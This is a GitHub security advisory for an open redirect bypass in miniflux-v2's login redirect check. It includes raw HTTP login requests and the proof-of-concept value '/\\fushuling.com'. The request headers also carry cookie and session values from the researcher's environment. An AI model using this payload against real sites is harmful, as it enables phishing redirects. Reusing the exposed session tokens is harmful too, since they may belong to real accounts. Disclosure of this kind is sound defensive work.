# [M] Open Redirect Bypass in miniflux-v2

## Summary
Severity: Medium
Advisory: GHSA-m999-j542-5w3r
CVE: CVE-2026-55185
CWE: CWE-601
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-m999-j542-5w3r
Type: github-advisory

## Affected
- Go: `miniflux.app/v2` — affected >=0 <2.3.1

## Details
### Summary
The URL restrictions in `miniflux-v2` can be bypassed by attackers, leading to an open redirect vulnerability.

### Details

Normally, the redirect URL needs to be validated using `IsRelativePath`.

<img width="1728" height="1386" alt="QQ20260526-175356-26-1" src="https://github.com/user-attachments/assets/b481845a-8744-41f7-b27a-526c7ac92e03" />

There are some security measures in place, such as requiring relative paths, prohibiting host and schema entries, and rejecting proof-of-concept (PoC) entries like `//fushuling.com`. However, these measures can still be bypassed.

<img width="1911" height="804" alt="QQ20260526-175836-26-2" src="https://github.com/user-attachments/assets/90353c7f-7247-4453-a781-159361de13d6" />

For a proof-of-concept (PoC) like `/\fushuling.com`, it lacks host and netloc fields and doesn't start with `//`, but during the actual browser redirection, the backslash is automatically parsed as a forward slash, ultimately redirecting to the external address `https://fushuling.com`, thus bypassing existing protections.

For PoCs like `//fushuling.com`, the existing logic successfully detects and resolves to `/unread`, effectively preventing attacks.

```
POST /login HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 92
Cache-Control: max-age=0
sec-ch-ua: "Not(A:Brand";v="24", "Chromium";v="122"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: cw_conversation=eyJhbGciOiJIUzI1NiJ9.eyJzb3VyY2VfaWQiOiI1NTlhZGZkNS0wMTMxLTRjOWUtYjJmMi1kZTQ4YzFmMzUwODMiLCJpbmJveF9pZCI6NTI3NTUsImV4cCI6MTc5MTk3MzU4OCwiaWF0IjoxNzc2NDIxNTg4fQ._8EAAv62saWBzO54yUJCbASbjbrNdMsYEC49blqJwQM; casdoor_session_id=cc333aee41d646565c1bde0bba532991; SSID=EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE.KKPgzj5eEsDglYQXFeERpo7F97-phtpOsQL0Sh9e_EA; sid=Q5hex9PpdqFKeVL41zT4W9DqyBnMJhVO; MinifluxSessionID=F5GAIDVFDZVTOTOWBLWKXCRNIE.HUQLKF4BMK42KUAM3N2VK4MA45
Connection: close

csrf=CYJ2SHTG7AYLMFW6TMTLRR4K54&redirect_url=//fushuling.com&username=admin&password=test123
```

<img width="1773" height="894" alt="QQ20260526-180410-26-3" src="https://github.com/user-attachments/assets/19e532ad-e366-4eb8-a08e-7b1de02edc7b" />

However, when the attacker specified the redirect URL as `/\fushuling.com`, the URL successfully bypassed the detection and set the location to /\fushuling.com.

```
POST /login HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 92
Cache-Control: max-age=0
sec-ch-ua: "Not(A:Brand";v="24", "Chromium";v="122"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: cw_conversation=eyJhbGciOiJIUzI1NiJ9.eyJzb3VyY2VfaWQiOiI1NTlhZGZkNS0wMTMxLTRjOWUtYjJmMi1kZTQ4YzFmMzUwODMiLCJpbmJveF9pZCI6NTI3NTUsImV4cCI6MTc5MTk3MzU4OCwiaWF0IjoxNzc2NDIxNTg4fQ._8EAAv62saWBzO54yUJCbASbjbrNdMsYEC49blqJwQM; casdoor_session_id=cc333aee41d646565c1bde0bba532991; SSID=EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE.KKPgzj5eEsDglYQXFeERpo7F97-phtpOsQL0Sh9e_EA; sid=Q5hex9PpdqFKeVL41zT4W9DqyBnMJhVO; MinifluxSessionID=54R3C5MYFRCW7JVL2WUP5GFW4Z.3FLK5B4S7R3O6ZRACB7A3B2RG5
Connection: close

csrf=QC7PJNLRRDHSF6OZPXFVPKAXEO&redirect_url=/\fushuling.com&username=admin&password=test123
```
<img width="1629" height="887" alt="QQ20260526-180606-26-4" src="https://github.com/user-attachments/assets/efe78aca-06ef-4369-83b7-0d7119ac2546" />

In the actual browser redirection, the URL successfully redirected to `https://fushuling.com`, thus bypassing the restrictions and achieving an open redirect attack.

<img width="1082" height="621" alt="QQ20260526-180711-26-5" src="https://github.com/user-attachments/assets/0b486f09-8a9b-4d38-8350-d7ca5c51c253" />


### PoC
```
/\fushuling.com
```

### Impact
Open Redirect

## References
- https://github.com/miniflux/v2/security/advisories/GHSA-m999-j542-5w3r
- https://github.com/miniflux/v2
